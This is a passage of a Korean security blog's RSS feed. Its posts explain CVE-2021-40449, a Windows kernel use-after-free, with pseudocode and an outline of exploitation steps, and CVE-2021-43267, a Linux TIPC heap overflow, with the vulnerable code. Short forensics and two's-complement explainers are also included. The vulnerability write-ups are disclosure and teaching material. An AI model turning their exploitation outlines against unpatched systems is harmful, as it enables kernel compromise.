      <category domain="https://hackyboiz.github.io/tags/reply-attack/">reply attack</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/16/y00n_nms/mac/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021–40449: Windows 커널의 UAF 취약점</title>
      <link>https://hackyboiz.github.io/2021/11/13/l0ch/2021-11-13/</link>
      <guid>https://hackyboiz.github.io/2021/11/13/l0ch/2021-11-13/</guid>
      <pubDate>Sat, 13 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://movaxbx.ru/2021/10/25/callbackhell/&quot;&gt;https:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://movaxbx.ru/2021/10/25/callbackhell/">https://movaxbx.ru/2021/10/25/callbackhell/</a></li><li><a href="https://ti.qianxin.com/blog/articles/CVE-2021-40449-vulnerability-recurrence-process/">https://ti.qianxin.com/blog/articles/CVE-2021-40449-vulnerability-recurrence-process/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Windows 10 build 14393</li><li>Microsoft Windows 10 build 17763</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows&#xC758; <code>win32kfull.sys</code> &#xCEE4;&#xB110; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; UAF &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>GreResetDCInternal</code>&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">BOOL <span class="hljs-title">GreResetDCInternal</span><span class="hljs-params">(HDC hdc,DEVMODEW *pdmw,BOOL </span></span><span class="hljs-function"><span class="hljs-params">*pbBanding,DRIVER_INFO_2W *pDriverInfo2,PVOID ppUMdhpdev)</span></span>{..    HDC hdcNew;    {        <span class="hljs-comment">// &#xB9E4;&#xAC1C;&#xBCC0;&#xC218; hdc&#xB85C;&#xBD80;&#xD130; DCOBJ dco &#xC0DD;&#xC131;</span>        <span class="hljs-function">DCOBJ <span class="hljs-title">dco</span><span class="hljs-params">(hdc)</span></span>;        <span class="hljs-keyword">if</span> (!dco.bValid())            SAVE_ERROR_CODE(ERROR_INVALID_HANDLE);        <span class="hljs-keyword">else</span> {            <span class="hljs-comment">// dco&#xB85C;&#xBD80;&#xD130; PDEVOBJ po &#xC0DD;&#xC131;</span>            PDEVOBJ po(dco.hdev());...          <span class="hljs-comment">// new DC &#xC0DD;&#xC131; </span><span class="hljs-comment">// &#xC774;&#xB54C; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xCF5C;&#xBC31;&#xC73C;&#xB85C; ResetDC&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xAD34;</span>            hdcNew = hdcOpenDCW(<span class="hljs-string">L&quot;&quot;</span>, pdmw, DCTYPE_DIRECT, po.hSpooler, prton, pDriverInfo2, ppUMdhpdev);            <span class="hljs-keyword">if</span> (hdcNew)            {                po-&gt;hSpooler = <span class="hljs-literal">NULL</span>;                <span class="hljs-function">DCOBJ <span class="hljs-title">dcoNew</span><span class="hljs-params">(hdcNew)</span></span>;                <span class="hljs-keyword">if</span> (!dcoNew.bValid())                    SAVE_ERROR_CODE(ERROR_INVALID_HANDLE);                <span class="hljs-keyword">else</span> {                    <span class="hljs-comment">// Transfer any remote fonts</span>                    dcoNew-&gt;pPFFList = dco-&gt;pPFFList;                    dco-&gt;pPFFList = <span class="hljs-literal">NULL</span>;                    <span class="hljs-comment">// Transfer any color transform</span>                    dcoNew-&gt;pCXFList = dco-&gt;pCXFList;                    dco-&gt;pCXFList = <span class="hljs-literal">NULL</span>;                    <span class="hljs-function">PDEVOBJ <span class="hljs-title">poNew</span><span class="hljs-params">((HDEV)dcoNew.pdc-&gt;ppdev())</span></span><span class="hljs-function"></span><span class="hljs-function">                    <span class="hljs-comment">// &#xD30C;&#xAD34;&#xB41C; &#xAE30;&#xC874; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0; &#xC811;&#xADFC;, UAF &#xD2B8;&#xB9AC;&#xAC70;</span></span><span class="hljs-function">                    PFN_DrvResetPDEV rfn </span>= po-&gt;ppfn[INDEX_DrvResetPDEV];                    <span class="hljs-keyword">if</span> (rfn != <span class="hljs-literal">NULL</span>)                        (*rfn)(po-&gt;dhpdev, poNew-&gt;dhpdev);...                }            }        }    }    <span class="hljs-comment">// Destroy old DC</span>...}</code></pre><p><code>hdcOpenDCW</code> &#xD638;&#xCD9C; &#xACFC;&#xC815;&#xC5D0;&#xC11C;  <code>DrvEnablePDEV</code>&#xB97C; &#xD6C4;&#xD0B9;&#xD574; <code>ResetDC</code>&#xB97C; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xCF5C;&#xBC31;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>GreResetDCInternal</code>&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xB514;&#xBC14;&#xC774;&#xC2A4; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xAC1D;&#xCCB4;&#xB97C; &#xD574;&#xC81C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>GreResetDCInternal</code> &#xB294; &#xAC1D;&#xCCB4;&#xAC00; &#xD574;&#xC81C;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC811;&#xADFC;&#xC744; &#xC2DC;&#xB3C4;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; UAF&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>KernelCallbackTable</code> &#xC5D0; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xCF5C;&#xBC31; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xC804;&#xC5ED; DC &#xAC1D;&#xCCB4;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; &#xD578;&#xB4E4;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>ResetDC</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xC804;&#xC5ED; DC&#xC758; &#xD578;&#xB4E4;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xACE0;, <code>ResetDC</code> &#xD568;&#xC218;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C;  <code>GreResetDCInternal</code> &#xC744; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>GreResetDCInternal</code>&#xC758; <code>hdcOpenDCW</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC9C1;&#xD6C4; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xCF5C;&#xBC31;&#xC73C;&#xB85C; &#xC778;&#xD574; <code>ResetDC</code> &#xB97C; &#xB2E4;&#xC2DC; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xACE0; <code>GreResetDCInternal</code>&#xB85C; &#xBCF5;&#xADC0;&#xD558;&#xC9C0;&#xB9CC; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD574;&#xC81C;&#xB41C; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC811;&#xADFC;&#xD574; UAF&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use-after-free</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2021-40449/">cve-2021-40449</category>
      
      <category domain="https://hackyboiz.github.io/tags/win32k/">win32k</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/13/l0ch/2021-11-13/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] 디지털 포렌식의 3대 요건</title>
      <link>https://hackyboiz.github.io/2021/11/12/poosic/forensic-3-elem/</link>
      <guid>https://hackyboiz.github.io/2021/11/12/poosic/forensic-3-elem/</guid>
      <pubDate>Fri, 12 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xB514;&amp;#xC9C0;&amp;#xD138; &amp;#xD3EC;&amp;#xB80C;&amp;#xC2DD;&amp;#xC5D0;&amp;#xB294; 5&amp;#xB300; &amp;#xC6D0;&amp;#xCE59;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xB514;&#xC9C0;&#xD138; &#xD3EC;&#xB80C;&#xC2DD;&#xC5D0;&#xB294; 5&#xB300; &#xC6D0;&#xCE59;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC6D0;&#xBCF8;&#xC131;, &#xC7AC;&#xD604;&#xC131;, &#xC2E0;&#xB8B0;&#xC131;, &#xC5F0;&#xACC4; &#xBCF4;&#xAD00;&#xC131;, &#xC2E0;&#xC18D;&#xC131;&#xC774; &#xADF8;&#xAC83;&#xC778;&#xB370;&#xC694;. &#xADF8;&#xC911; &#xC99D;&#xAC70;&#xB85C;&#xC368; &#xC778;&#xC815;&#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xC870;&#xAC74;&#xACFC; &#xC9C1;&#xACB0;&#xB41C; 3&#xAC1C;&#xC758; &#xC6D0;&#xCE59;, &#xC6D0;&#xBCF8;&#xC131;, &#xC7AC;&#xD604;&#xC131;, &#xC815;&#xB2F9;&#xC131;&#xC744; &#xAC00;&#xB9AC;&#xCF1C; &#xB514;&#xC9C0;&#xD138; &#xD3EC;&#xB80C;&#xC2DD;&#xC758; 3&#xB300; &#xC694;&#xAC74;&#xC774;&#xB77C;&#xACE0; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC6D0;&#xBCF8;&#xC131;"><a href="#&#xC6D0;&#xBCF8;&#xC131;" class="headerlink" title="&#xC6D0;&#xBCF8;&#xC131;"></a>&#xC6D0;&#xBCF8;&#xC131;</h3><p>&#xC6D0;&#xBCF8;&#xC131;&#xC740; &#xC99D;&#xAC70;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xD3EC;&#xB80C;&#xC2DD; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC218;&#xC815;&#xC774;&#xB098; &#xBCC0;&#xB3D9; &#xC5C6;&#xC774; &#xC6D0;&#xBCF8;&#xACFC; &#xAC19;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xB2F9;&#xC2DC;&#xC758; <a href="https://hackyboiz.github.io/2021/09/10/poosic/Hash-Function/">&#xD574;&#xC2DC;&#xAC12;</a>&#xC73C;&#xB85C; &#xC785;&#xC99D;&#xD558;&#xB294; &#xAC83;&#xC744; &#xB9D0;&#xD574;&#xC694;. &#xC5EC;&#xAE30;&#xC11C; &#xD574;&#xC2DC;&#xAC12;&#xC740; &#xBCF5;&#xC0AC;&#xB41C; &#xC99D;&#xAC70;&#xC640; &#xC6D0;&#xBCF8; &#xD30C;&#xC77C;&#xC774; &#xAC19;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC785;&#xC99D;&#xD560; &#xC218; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC758;&#xBBF8;&#xD558;&#xB294;&#xB370;, &#xC0AC;&#xB78C;&#xC73C;&#xB85C; &#xB530;&#xC9C0;&#xBA74; &#xC9C0;&#xBB38;&#xACFC; &#xAC19;&#xB2E4;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC7AC;&#xD604;&#xC131;"><a href="#&#xC7AC;&#xD604;&#xC131;" class="headerlink" title="&#xC7AC;&#xD604;&#xC131;"></a>&#xC7AC;&#xD604;&#xC131;</h3><p>&#xC7AC;&#xD604;&#xC131;&#xC740; &#xAC19;&#xC740; &#xBD84;&#xC11D; &#xD234;&#xACFC; &#xAC19;&#xC740; &#xBD84;&#xC11D;&#xC21C;&#xC11C;, &#xAC19;&#xC740; &#xBD84;&#xC11D; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB204;&#xAD6C;&#xB098; &#xD56D;&#xC0C1; &#xAC19;&#xC740; &#xBD84;&#xC11D; &#xACB0;&#xACFC;&#xAC00; &#xC0B0;&#xCD9C;&#xB418;&#xC5B4;&#xC57C; &#xD558;&#xB294; &#xAC83;&#xC744; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;. &#xB2F9;&#xC5F0;&#xD788; &#xAC19;&#xC740; &#xD234;&#xACFC; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC600;&#xB294;&#xB370;&#xB3C4; &#xB2E4;&#xB978; &#xACB0;&#xACFC;&#xAC00; &#xB098;&#xC628;&#xB2E4;&#xBA74; &#xC77C;&#xAD00;&#xC131; &#xC788;&#xB294; &#xC99D;&#xAC70;&#xB85C; &#xCC44;&#xD0DD;&#xB420; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xC2E0;&#xB8B0;&#xC131;"><a href="#&#xC2E0;&#xB8B0;&#xC131;" class="headerlink" title="&#xC2E0;&#xB8B0;&#xC131;"></a>&#xC2E0;&#xB8B0;&#xC131;</h3><p>&#xC2E0;&#xB8B0;&#xC131;&#xC740; &#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xD574;&#xB2F9; &#xC99D;&#xAC70;&#xAC00; &#xC5BC;&#xB9C8;&#xB098; &#xBBFF;&#xC744;&#xB9CC;&#xD55C;&#xAC00;&#xC5D0; &#xB300;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC99D;&#xAC70;&#xC5D0; &#xB300;&#xD55C; &#xC2E0;&#xB8B0;&#xC131;&#xC740; &#xD3EC;&#xB80C;&#xC2DD; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD55C; &#xD234;&#xC774; &#xAC80;&#xCC30;&#xCCAD;, &#xACBD;&#xCC30;&#xCCAD; &#xD639;&#xC740; &#xAD6D;&#xC815;&#xC6D0; &#xB4F1; &#xAD6D;&#xAC00; &#xAE30;&#xAD00;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB420; &#xB9CC;&#xD07C; &#xACF5;&#xC778;&#xBC1B;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC778;&#xC9C0;, &#xBBFF;&#xC744;&#xB9CC;&#xD55C; &#xAE30;&#xAD00;&#xC5D0;&#xC11C; &#xC804;&#xBB38;&#xAC00;&#xC5D0; &#xC758;&#xD574; &#xD3EC;&#xB80C;&#xC2DD;&#xC774; &#xC9C4;&#xD589;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xC694;&#xC18C;&#xB97C; &#xD1B5;&#xD574; &#xAC80;&#xC99D;&#xBC1B;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/forensic/">forensic</category>
      
      <category domain="https://hackyboiz.github.io/tags/forensics/">forensics</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/12/poosic/forensic-3-elem/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-43267: Remote Linux Kernel Heap Overflow | TIPC Module Allows Arbitrary Code Execution</title>
      <link>https://hackyboiz.github.io/2021/11/11/fabu1ous/2021-11-11/</link>
      <guid>https://hackyboiz.github.io/2021/11/11/fabu1ous/2021-11-11/</guid>
      <pubDate>Thu, 11 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.sentinelone.com/labs/tipc-remote-linux-kernel</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.sentinelone.com/labs/tipc-remote-linux-kernel-heap-overflow-allows-arbitrary-code-execution/">CVE-2021-43267</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux kernel &lt; 5.14.16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>TIPC(Transparent Inter-Process Communicaion)&#xB294; Cluster Communication&#xC5D0; &#xCD5C;&#xC801;&#xD654;&#xB41C; IPC&#xB85C; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xBA54;&#xC774;&#xC800; Linux &#xBC30;&#xD3EC; &#xBC84;&#xC804; &#xCEE4;&#xB110;&#xC5D0; &#xD574;&#xB2F9; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC774; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. 5.14.16 &#xC774;&#xC804; Linux kernel&#xC758; net/tipc/crypto.c&#xC5D0;&#xC11C; Heap overflow &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tipc_aead_key</span> {</span><span class="hljs-keyword">char</span> alg_name[TIPC_AEAD_ALG_NAME];<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> keylen; <span class="hljs-comment">/* in bytes */</span><span class="hljs-keyword">char</span> key[]; };</code></pre><p>2020&#xB144; &#xC554;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xC8FC;&#xACE0; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; MSG_CRYPTO&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; TIPC &#xBA54;&#xC138;&#xC9C0; &#xD615;&#xC2DD;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xC5C8;&#xB294;&#xB370; &#xC704; &#xCF54;&#xB4DC;&#xB294; &#xD574;&#xB2F9; &#xBA54;&#xC138;&#xC9C0;&#xC758; body structure&#xC785;&#xB2C8;&#xB2E4;. TIPC &#xBAA8;&#xB4C8;&#xC740; &#xD574;&#xB2F9; &#xBA54;&#xC138;&#xC9C0; payload&#xB97C; &#xBCF5;&#xC0AC;&#xD558;&#xAE30; &#xC704;&#xD574; Payload Size(Message Size - Header Size)&#xB97C; &#xACC4;&#xC0B0;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBB38;&#xC81C;&#xB294; Header Size&#xC640; Message Size&#xB294; <code>tipc_msg_validate</code>&#xC5D0;&#xC11C; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xC81C; &#xBA54;&#xC138;&#xC9C0;&#xC778; <code>keylen</code>&#xC758; &#xAE38;&#xC774; &#xAC80;&#xC99D;&#xC740; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989; <code>keylen</code>&#xC758; &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xD06C;&#xAE30;&#xB97C; &#xB118;&#xC5B4;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB36E;&#xC5B4; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">/* Allocate memory for the key */</span>  skey = kmalloc(size, GFP_ATOMIC);<span class="hljs-comment">/* ... */</span>  <span class="hljs-comment">/* Copy key from msg data */</span>  skey-&gt;keylen = ntohl(*((__be32 *)(data + TIPC_AEAD_ALG_NAME)));  <span class="hljs-built_in">memcpy</span>(skey-&gt;alg_name, data, TIPC_AEAD_ALG_NAME);  <span class="hljs-built_in">memcpy</span>(skey-&gt;key, data + TIPC_AEAD_ALG_NAME + <span class="hljs-keyword">sizeof</span>(__be32),         skey-&gt;keylen);</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/overflow/">overflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/tipc/">tipc</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/11/fabu1ous/2021-11-11/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Two&#39;s complement(2의 보수)</title>
      <link>https://hackyboiz.github.io/2021/11/10/y00n_nms/twos-complement/</link>
      <guid>https://hackyboiz.github.io/2021/11/10/y00n_nms/twos-complement/</guid>
      <pubDate>Wed, 10 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;&amp;#xAC00; &amp;#xC74C;&amp;#xC218;&amp;#xB97C; &amp;#xD45C;&amp;#xD604;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xC2DD;&amp;#xC5D0;&amp;#xB294; &amp;#xD06C;&amp;#xAC</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xC74C;&#xC218;&#xB97C; &#xD45C;&#xD604;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC5D0;&#xB294; &#xD06C;&#xAC8C; &#xC138; &#xAC00;&#xC9C0;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xCD5C;&#xC0C1;&#xC704; &#xBE44;&#xD2B8;(MSB)&#xB97C; &#xBD80;&#xD638; &#xBE44;&#xD2B8;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; + &#xB610;&#xB294; -&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xBC29;&#xBC95;&#xACFC; &#xC591;&#xC218;(&#xC808;&#xB313;&#xAC12;)&#xC758; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB97C; &#xBC18;&#xC804;&#xD558;&#xC5EC; &#xC74C;&#xC218;&#xB97C; &#xD45C;&#xD604;&#xD558;&#xB294; 1&#xC758; &#xBCF4;&#xC218;&#xC740; +0&#xACFC; -0&#xC774; &#xB530;&#xB85C; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xB294; &#xB2E8;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4; 1&#xC77C;&#xB54C; +, 0&#xC77C;&#xB54C; -&#xB77C;&#xACE0; &#xBD80;&#xD638; &#xBE44;&#xD2B8;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; +0&#xC740; <code>1000</code>, -1&#xC740; <code>0000</code>&#xC73C;&#xB85C; &#xD45C;&#xD604;&#xB418;&#xBA70; 1&#xC758; &#xBCF4;&#xC218;&#xC5D0;&#xC11C;&#xB294; +0&#xC740; <code>0000</code>, -0&#xC740; <code>1111</code>&#xB85C; &#xD45C;&#xD604;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xBB38;&#xC81C;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xD574;&#xB2F5;&#xC73C;&#xB85C; 2&#xC758; &#xBCF4;&#xC218;&#xAC00; &#xACE0;&#xC548;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xB530;&#xB77C;&#xC11C; &#xD604;&#xC7AC; &#xBAA8;&#xB4E0; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC74C;&#xC218;&#xC758; &#xD45C;&#xD604; &#xBC29;&#xBC95;&#xC73C;&#xB85C; 2&#xC758; &#xBCF4;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>2&#xC758; &#xBCF4;&#xC218;&#xB294; &#xC8FC;&#xC5B4;&#xC9C4; &#xC218;&#xB97C; &#xCEE4;&#xB2E4;&#xB780; 2&#xC758; &#xC81C;&#xACF1;&#xC218;&#xC5D0;&#xC11C; &#xBE7C;&#xC11C; &#xC5BB;&#xC740; &#xC774;&#xC9C4;&#xC218;&#xB77C;&#xB294; &#xB73B;&#xC73C;&#xB85C;, &#xC27D;&#xAC8C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; 1&#xC758; &#xBCF4;&#xC218;&#xC5D0; 1&#xC744; &#xB354;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>8&#xBE44;&#xD2B8;&#xC5D0;&#xC11C; +16(<code>00010000</code>)&#xC5D0;&#xC11C; -16&#xC740; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB97C; &#xBC18;&#xC804;&#xD55C; 1&#xC758; &#xBCF4;&#xC218;(<code>11101111</code>)&#xC5D0; 1&#xC744; &#xB354;&#xD558;&#xC5EC; <code>11110000</code>&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p>16&#xBE44;&#xD2B8;&#xC5D0;&#xC11C; +1(<code>0000000000000001</code>)&#xC5D0;&#xC11C; -1&#xC744; &#xACC4;&#xC0B0;&#xD560; &#xB54C;&#xB294; +1&#xC5D0;&#xC11C; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB97C; &#xBC18;&#xC804;&#xD55C; <code>1111111111111110</code>&#xC5D0;&#xC11C; 1&#xC744; &#xB354;&#xD574; <code>1111111111111111</code>&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/two-s-complement/">two&#39;s complement</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/10/y00n_nms/twos-complement/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-41117: Keypair 모듈의 잘못된 랜덤 시드 생성</title>
      <link>https://hackyboiz.github.io/2021/11/09/d0hwq1/2021-11-09/</link>
      <guid>https://hackyboiz.github.io/2021/11/09/d0hwq1/2021-11-09/</guid>
      <pubDate>Tue, 09 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
